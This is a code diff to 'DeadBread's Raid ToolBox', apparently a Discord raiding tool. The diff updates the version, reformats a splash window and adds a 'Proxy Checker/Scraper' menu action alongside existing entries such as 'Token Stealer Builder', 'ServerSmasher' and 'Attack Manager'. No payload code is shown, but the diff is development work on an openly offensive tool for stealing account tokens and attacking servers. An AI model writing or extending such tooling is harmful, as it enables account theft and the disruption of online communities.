@@ -346,7 +346,7 @@
 # Public License instead of this License.
 
 
-rtbversion = "1.1.0.b053"
+rtbversion = "1.1.0.b054"
 
 # Load Config
 try:
@@ -595,8 +595,8 @@ if not command_line_mode == 1:
 if __name__ == "__main__":
     if not command_line_mode == 1:
         layout = [
-                [sg.Image(data=rtb_splash, pad=((0, 0), 0))]
-                ]
+            [sg.Image(data=rtb_splash, pad=((0, 0), 0))]
+        ]
         window = sg.Window("DeadBread's Raid ToolBox v{} | Loading...".format(rtbversion), icon=rtb_icon, no_titlebar=True, grab_anywhere=True, margins=(0,0)).Layout(layout)
         window.Read(timeout=0)
 
@@ -1191,7 +1191,7 @@ def main():
     #  \___|\___/|___|
     elif command_line_mode == 0:
         menu_def = [
-            ['RTB', ['Attack Manager', 'Themes', ['Change Theme', 'Theme Repo'], 'Options', ['Updater', 'Settings'], 'About', ['Info', 'Diagnostics', 'CPU Widget', 'CF Check']]],
+            ['RTB', ['Attack Manager', 'Themes', ['Change Theme', 'Theme Repo'], 'Options', ['Updater', 'Settings', 'Proxy Checker/Scraper'], 'About', ['Info', 'Diagnostics', 'CPU Widget', 'CF Check']]],
             ['Tokens', ['View/Add Tokens', 'Change Token List', 'Token Stealer Builder', 'Token Toolkit']],
             ['Help', ['Wiki', 'My YouTube', 'Nope', 'Telegram']],
             ['ServerSmasher', ['Launch GUI', 'Launch Legacy']],
@@ -1629,6 +1629,9 @@ def main():
                             handle.seek(0)
                             json.dump(edit, handle, indent=4)
                             handle.truncate()
+            elif event == "Proxy Checker/Scraper":
+                p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','ProxyScraper', sys.executable, str(command_line_mode), str(thread_count), str(attacks_theme)], stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                currentattacks["Proxy Checker/Scraper | Started at: {}".format(datetime.datetime.now().time())] = p.pid
             #    _   _              _
             #   /_\ | |__  ___ _  _| |_
             #  / _ \| '_ \/ _ \ || |  _|
@@ -1805,7 +1808,7 @@ def main():
                             layout.append([sg.Button("Create New...", size=(10,1))])
                             window = sg.Window("DeadBread's Raid ToolBox v{} | Token lists".format(rtbversion)).Layout(layout)
             elif event == "Token Stealer Builder":
-                p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','StealerBuilder',sys.executable,str(command_line_mode),str(thread_count),str(attacks_theme)],stdout=open("errors.log", "a+"), stderr=subprocess.STDOUT)
+                p = subprocess.Popen([sys.executable,'RTBFiles/attack_controller.py','StealerBuilder',sys.executable,str(command_line_mode),str(thread_count),str(attacks_theme)])
                 currentattacks["Token Stealer Builder | Started at: {}".format(datetime.datetime.now().time())] = p.pid
             elif event == "Token Toolkit":
                 window.Close()
@@ -2064,6 +2067,7 @@ def main():
                         time.sleep(0.5)
                         os.remove("plugins/{}.zip".format(event.replace(" ", "_")))
                         sg.Popup("Downloaded {}".format(event),title="Download Complete.")
+
     else:
         #   ___                  _
         #  / __|___ _ _  ___ ___| |___
